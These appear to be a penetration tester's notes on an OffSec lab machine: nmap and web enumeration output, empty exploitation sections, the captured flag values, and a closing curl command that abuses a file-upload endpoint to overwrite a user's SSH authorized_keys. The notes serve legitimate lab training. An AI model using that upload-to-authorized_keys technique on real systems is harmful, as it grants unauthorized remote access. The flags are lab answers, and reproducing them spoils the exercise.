# [About]

```
=========================================================================
[OS]: 
[Web-Technology]: 
[Hostname]: 
[IP]:         192.168.148.249
[USERS]: 
[CREDENTIALS]: 
=========================================================================
```
-----------------------------------------------------------------------------

# [Enumeration]

--	[Network Enumeration]

```
PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
25022/tcp open  ssh     syn-ack OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD6xv/PZkusP5TZdYJWDT8TTNY2xojo5b2DU/zrXm1tP4kkjNCGmwq8UwFrjo5EbEbk3wMmgHBnE73XwgnqaPd4=
|   256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRX3RvvSVPY3FJV9u7N2xIQbLJgQoEMkmRMey39/Jxz
33414/tcp open  unknown syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.3 Python/3.9.13
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
40080/tcp open  http    syn-ack Apache httpd 2.4.53 ((Fedora))
|_http-server-header: Apache/2.4.53 (Fedora)

Service Info: OS: Unix



```
-----------------------------------------------------------------------------

--	[Web Enumeration]

```
--> Files  --> Directories
200      GET        1l       19w      137c http://192.168.148.249:33414/help
200      GET        1l       14w       98c http://192.168.148.249:33414/info
```
-----------------------------------------------------------------------------
# [Foothold]


```bash

```

-----------------------------------------------------------------------------
# [Pivoting]


```bash

```

-----------------------------------------------------------------------------

# [Privilege-Escalation]

--> 

```bash

```
-----------------------------------------------------------------------------
# [Take away Concept]
```
=========================================================================
* 
* 

=========================================================================
```

-----------------------------------------------------------------------------
# [Flags]

`local.txt : bad16811f52cebb5e46d3b538679adde`
`proof.txt : c24d480753c39d7fd6cc24fab95de080`



curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_rsa.txt http://192.168.148.249:33414/file-upload


#offsec #easy